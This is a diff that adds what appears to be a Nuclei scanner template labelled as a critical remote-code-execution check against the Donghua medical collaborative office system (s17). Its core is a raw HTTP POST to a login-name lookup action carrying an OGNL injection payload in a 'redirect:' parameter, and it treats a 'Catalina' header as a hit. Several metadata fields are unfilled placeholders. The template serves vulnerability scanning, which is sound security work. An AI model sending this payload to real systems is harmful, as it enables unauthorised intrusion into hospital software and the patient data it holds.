@@ -1,0 +1,37 @@
+id: donghua-OA-s17-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 东华医疗协同办公系统-s17
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /organization/getUserNameByLoginName.action HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: JSESSIONID=95294CA64F0E6006E6AD878C43FB61BE
+        Sec-Ch-Ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "Windows"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Content-type: application/x-www-form-urlencoded
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,ko;q=0.6
+        Connection: close
+        Content-Length: 61
+
+        redirect:${#application.get('javax.servlet.context.tempdir')}
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'Catalina'
